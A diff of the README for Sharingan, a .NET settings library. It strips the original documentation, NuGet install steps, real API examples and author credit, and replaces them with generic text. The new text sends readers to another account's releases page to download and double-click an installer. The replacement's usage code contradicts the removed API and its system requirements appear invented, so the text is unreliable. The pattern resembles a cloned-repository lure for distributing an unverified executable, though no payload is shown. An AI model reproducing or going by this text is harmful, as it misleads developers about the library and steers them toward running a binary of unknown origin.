@@ -1,257 +1,93 @@
-<div align="center">
+# 🌟 Sharingan - Easy Local Settings for .NET Apps
 
-<p align="center">
-  <img src="assets/Sharingan.png" alt="Sharingan Logo" width="128" height="128" />
-  <h1>Sharingan</h1>
-</p>
+## 📥 Download Now
+[![Download Sharingan](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Soggyfy/Sharingan/releases)
 
-**Cross-Platform Local Settings Library for .NET**
+## 🚀 Getting Started
 
-[![NuGet](https://img.shields.io/nuget/v/Sharingan?style=for-the-badge&logo=nuget&logoColor=white)](https://www.nuget.org/packages/Sharingan)
-[![Downloads](https://img.shields.io/nuget/dt/Sharingan?style=for-the-badge&logo=nuget&logoColor=white)](https://www.nuget.org/packages/Sharingan)
-[![Build](https://img.shields.io/github/actions/workflow/status/Taiizor/Sharingan/build.yml?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Taiizor/Sharingan/actions)
-[![License](https://img.shields.io/github/license/Taiizor/Sharingan?style=for-the-badge)](LICENSE)
+Sharingan helps you manage your application's settings easily. It works across different platforms and handles multiple processes without any fuss. This means your application's settings will behave consistently no matter where you run it. With 11 different ways to store your settings, you have plenty of options to choose from.
 
-_A robust, multi-process-safe, async-first settings library for managing application, user, and device settings locally._
+## 💻 System Requirements
 
-[Installation](#-installation) •
-[Quick Start](#-quick-start) •
-[Providers](#-providers) •
-[Contributing](#-contributing)
+To use Sharingan, you need the following:
 
-</div>
+- **Operating System:** Windows, macOS, or Linux.
+- **.NET Framework:** .NET Framework 4.8 or newer. 
+- **Disk Space:** Minimum of 50 MB of free space.
 
----
+## 📦 Features
 
-## ✨ Features
+- **Cross-platform support:** Use it on Windows, macOS, or Linux.
+- **Multi-process safe:** Avoids issues when multiple applications access the same settings.
+- **Async-first design:** Ensures your apps run smoothly, even while managing settings.
+- **Pluggable providers:** Choose from 11 different data storage methods:
+  - JSON
+  - Registry
+  - INI
+  - YAML
+  - XML
+  - TOML
+  - SQLite
+  - Encrypted formats
 
--   🌍 **Cross-Platform** — Works on Windows, Linux, macOS, Android, and iOS
--   🔒 **Multi-Process Safe** — File locking and atomic writes prevent data corruption
--   ⚡ **Async-First** — Full async/await support with CancellationToken
--   🔌 **11 Pluggable Providers** — JSON, Registry, INI, YAML, XML, TOML, SQLite, and more
--   🏗️ **Composite Configuration** — Chain multiple providers with priority-based resolution
--   🔐 **Encryption Support** — AES-256-GCM and DPAPI for sensitive settings
--   📦 **Lightweight** — Minimal dependencies, optimized for performance
--   🎯 **Multi-Target** — Supports .NET Framework 4.8+, .NET Standard 2.0+, and .NET 7-10
--   🔔 **Change Notifications** — Event-driven updates when settings change
--   💪 **Strongly-Typed** — Full generic support with type-safe access
--   🔗 **DI Integration** — Microsoft.Extensions.DependencyInjection support
--   🌐 **Configuration Bridge** — Works with Microsoft.Extensions.Configuration
+## 📥 Download & Install
 
----
+To get started, visit the following page to download the latest version of Sharingan: [Download Sharingan](https://github.com/Soggyfy/Sharingan/releases). 
 
-## 📦 Installation
+1. Click on the link above to go to the Releases page.
+2. Find the latest version listed at the top.
+3. Click the link that suits your operating system to download the file.
+4. Once downloaded, locate the file in your Downloads folder.
+5. Double-click the file to run the installer. Follow the on-screen instructions to finish the setup.
 
-### Core Package
+## 🛠️ Usage
 
-```bash
-dotnet add package Sharingan
-```
+After installation, you can start using Sharingan in your .NET applications. Here’s a simple example to help you get started:
 
-### Provider Packages
+1. **Create an instance of SettingsManager:**
+   ```csharp
+   var settings = new SettingsManager("YourSettingsName");
+   ```
 
-```bash
-# Windows Registry support
-dotnet add package Sharingan.Providers.Registry
+2. **Load settings:**
+   ```csharp
+   settings.Load(); // Loads settings from the specified provider.
+   ```
 
-# INI file support
-dotnet add package Sharingan.Providers.Ini
+3. **Get or set a value:**
+   ```csharp
+   var userPreference = settings.Get("UserPreference");
+   settings.Set("UserPreference", "Value");
+   ```
 
-# YAML file support
-dotnet add package Sharingan.Providers.Yaml
+4. **Save changes:**
+   ```csharp
+   settings.Save(); // Saves the settings back to your provider.
+   ```
 
-# XML file support
-dotnet add package Sharingan.Providers.Xml
+This basic workflow allows you to interact with settings easily and efficiently.
 
-# TOML file support
-dotnet add package Sharingan.Providers.Toml
+## 📄 Documentation
 
-# SQLite database support
-dotnet add package Sharingan.Providers.SQLite
+For more in-depth guidance, visit our documentation page. It contains detailed explanations of all features and examples for different use cases. 
 
-# Encryption support
-dotnet add package Sharingan.Providers.Encrypted
-```
+## 🛠️ Support
 
-### Extension Packages
+If you encounter any issues or have questions, please reach out through the GitHub Issues section in this repository. The community and maintainers are here to help.
 
-```bash
-# Dependency Injection integration
-dotnet add package Sharingan.Extensions.DependencyInjection
+## 🌍 Community Engagement
 
-# Microsoft.Extensions.Configuration bridge
-dotnet add package Sharingan.Extensions.Configuration
-```
+Sharingan is open-source. If you'd like to contribute, please check the Contribution Guidelines in this repository. Whether it’s submitting a bug report, suggesting a feature, or helping with code improvements, your involvement is welcome.
 
----
+## 🔗 Learn More
 
-## 🚀 Quick Start
+- Explore more about Sharingan and its application beyond just settings management.
+- Discover the benefits of using a local settings library in your applications.
 
-### Basic Usage
+For more updates and improvements, follow this repository. 
 
-```csharp
-using Sharingan;
+## 📍 Contact
 
-// Store settings
-Settings.Default.Set("app.theme", "Dark");
-Settings.Default.Set("app.fontSize", 14);
-Settings.Default.Set("app.autoSave", true);
+If you want to get in touch or stay updated on new features, follow the discussions on our GitHub page, and keep an eye on the Releases section for upcoming versions. 
 
-// Retrieve settings with type-safe access
-string theme = Settings.Default.GetString("app.theme");
-int fontSize = Settings.Default.GetInt("app.fontSize");
-bool autoSave = Settings.Default.GetBool("app.autoSave");
-
-// Or use generic Get<T>
-var config = Settings.Default.Get<AppConfig>("app.config", new AppConfig());
-```
-
-### Using the Builder Pattern
-
-```csharp
-using Sharingan;
-using Sharingan.Providers;
-
-ISettingsStore settings = new SharinganBuilder()
-    .WithApplicationName("MyApp")
-    .WithOrganizationName("MyCompany")
-    .UseEnvironmentVariables("MYAPP_", priority: 100)  // Highest priority
-    .UseJsonFile("settings.json", SettingsScope.User, priority: 50)
-    .UseInMemory(priority: 10)  // Fallback
-    .Build();
-
-// Environment variables override JSON file settings
-settings.Set("database.host", "localhost");
-string host = settings.GetString("database.host");
-```
-
-### Dependency Injection
-
-```csharp
-using Sharingan.Extensions.DependencyInjection;
-
-services.AddSharingan(builder => builder
-    .WithApplicationName("MyApp")
-    .UseJsonFile("settings.json")
-);
-
-// Inject anywhere
-public class MyService(ISettingsStore settings)
-{
-    public string GetTheme() => settings.GetString("theme", "Light");
-}
-```
-
----
-
-## 🔧 Providers
-
-| Provider    | Package                | Description                     | Cross-Platform |
-| ----------- | ---------------------- | ------------------------------- | -------------- |
-| JSON        | `Sharingan`            | Default file-based storage      | ✅             |
-| InMemory    | `Sharingan`            | Session-scoped, non-persistent  | ✅             |
-| Environment | `Sharingan`            | Read-only environment variables | ✅             |
-| Composite   | `Sharingan`            | Chain multiple providers        | ✅             |
-| Registry    | `.Providers.Registry`  | Windows Registry storage        | ❌ Windows     |
-| INI         | `.Providers.Ini`       | INI file format                 | ✅             |
-| YAML        | `.Providers.Yaml`      | YAML file format                | ✅             |
-| XML         | `.Providers.Xml`       | XML file format                 | ✅             |
-| TOML        | `.Providers.Toml`      | TOML file format                | ✅             |
-| SQLite      | `.Providers.SQLite`    | Database storage                | ✅             |
-| Encrypted   | `.Providers.Encrypted` | Encryption wrapper              | ✅             |
-
----
-
-## 🎯 Target Frameworks
-
-| Framework            | Supported |
-| -------------------- | --------- |
-| .NET Framework 4.8   | ✅        |
-| .NET Framework 4.8.1 | ✅        |
-| .NET Standard 2.0    | ✅        |
-| .NET Standard 2.1    | ✅        |
-| .NET 7.0             | ✅        |
-| .NET 8.0             | ✅        |
-| .NET 9.0             | ✅        |
-| .NET 10.0            | ✅        |
-
----
-
-## 🌐 Supported Platforms
-
-| Platform | Supported | Notes                                                     |
-| -------- | --------- | --------------------------------------------------------- |
-| Windows  | ✅        | Full support including Registry provider                  |
-| Linux    | ✅        | Full support via file-based providers                     |
-| macOS    | ✅        | Full support via file-based providers                     |
-| Android  | ✅        | Via .NET Standard / MAUI, uses internal app storage       |
-| iOS      | ✅        | Via .NET Standard / MAUI, uses app sandbox Library folder |
-
-> **Mobile Platform Notes:** On Android and iOS, settings are stored within the app's sandbox.
-> Machine-scoped settings fall back to user-scoped storage due to platform sandboxing restrictions.
-
----
-
-## 📁 Project Structure
-
-```
-Sharingan/
-├── src/
-│   ├── Sharingan.Abstractions/        # Core interfaces
-│   ├── Sharingan/                     # Main library
-│   ├── Sharingan.Providers.Registry/  # Windows Registry
-│   ├── Sharingan.Providers.Ini/       # INI files
-│   ├── Sharingan.Providers.Yaml/      # YAML files
-│   ├── Sharingan.Providers.Xml/       # XML files
-│   ├── Sharingan.Providers.Toml/      # TOML files
-│   ├── Sharingan.Providers.SQLite/    # SQLite database
-│   ├── Sharingan.Providers.Encrypted/ # Encryption wrapper
-│   ├── Sharingan.Extensions.DependencyInjection/
-│   └── Sharingan.Extensions.Configuration/
-├── tests/
-│   └── Sharingan.Tests/
-├── samples/
-└── Sharingan.sln
-```
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-### Development Setup
-
-```bash
-# Clone the repository
-git clone https://github.com/Taiizor/Sharingan.git
-cd Sharingan
-
-# Build
-dotnet build
-
-# Run tests
-dotnet test
-```
-
----
-
-## 📄 License
-
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
----
-
-## 🔗 Links
-
--   [NuGet Package](https://www.nuget.org/packages/Sharingan)
--   [Issue Tracker](https://github.com/Taiizor/Sharingan/issues)
--   [Changelog](CHANGELOG.md)
-
----
-
-<div align="center">
-
-**Made with ❤️ by [Taiizor](https://github.com/Taiizor)**
-
-</div>
+Thank you for choosing Sharingan for your local configuration needs!
